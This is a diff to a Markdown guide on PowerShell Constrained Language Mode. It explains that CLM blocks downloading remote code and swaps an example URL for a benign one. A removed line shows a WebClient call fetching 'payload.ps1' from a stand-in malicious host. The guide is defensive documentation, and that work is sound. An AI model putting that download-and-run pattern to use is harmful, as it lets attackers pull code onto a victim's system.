@@ -296,11 +296,14 @@ Only a small set of "core" types and operations are permitted:
 
 This design specifically prevents attackers from pulling and executing code from the internet or accessing sensitive system APIs through PowerShell.
 
-### Example - Blocked CLM Operation
+### Demonstrating CLM Behavior - Blocked CLM Operation
 
 ```powershell
+# Check current language mode first
+$ExecutionContext.SessionState.LanguageMode
+
 # This command will FAIL in Constrained Language Mode:
-[System.Net.WebClient]::new().DownloadString('http://malicious.site/payload.ps1')
+[System.Net.WebClient]::new().DownloadString('https://example.com/test.txt')
 ```
 
 **Error Output**:
@@ -310,17 +313,6 @@ Cannot invoke method. Method invocation is supported only on core types in this 
 
 (Exact wording may vary by PowerShell version, but the behavior is consistent.)
 
-### Demonstrating CLM Behavior
-
-To safely demonstrate CLM restrictions, use a benign URL while keeping the structure that CLM will block:
-
-```powershell
-# Check current language mode first
-$ExecutionContext.SessionState.LanguageMode
-
-# Attempt to download content (will fail in CLM, succeed in FullLanguage)
-[System.Net.WebClient]::new().DownloadString('https://example.com/test.txt')
-```
 
 **In FullLanguage mode**: The command executes successfully and downloads the content.
 
